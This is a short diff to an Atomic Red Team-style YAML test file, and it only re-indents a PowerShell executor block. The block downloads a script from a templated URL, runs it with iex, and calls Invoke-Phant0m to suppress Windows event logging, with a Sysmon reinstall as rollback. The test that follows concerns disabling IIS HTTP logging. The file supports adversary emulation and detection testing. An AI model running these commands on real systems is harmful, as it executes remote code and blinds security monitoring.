@@ -145,11 +145,11 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-    iex(New-Object System.Net.WebClient).DownloadString('#{phant0m_url}');
-    Invoke-Phant0m
-    #rollback
-    C:\AtomicRedTeam\tools\uninstall_sysmon.ps1
-    C:\AtomicRedTeam\tools\install_sysmon.ps1
+      iex(New-Object System.Net.WebClient).DownloadString('#{phant0m_url}');
+      Invoke-Phant0m
+      #rollback
+      C:\AtomicRedTeam\tools\uninstall_sysmon.ps1
+      C:\AtomicRedTeam\tools\install_sysmon.ps1
 
 - name: Disable Windows IIS HTTP Logging
   uuid: 31aeec43-c659-4369-9439-3764a276e957
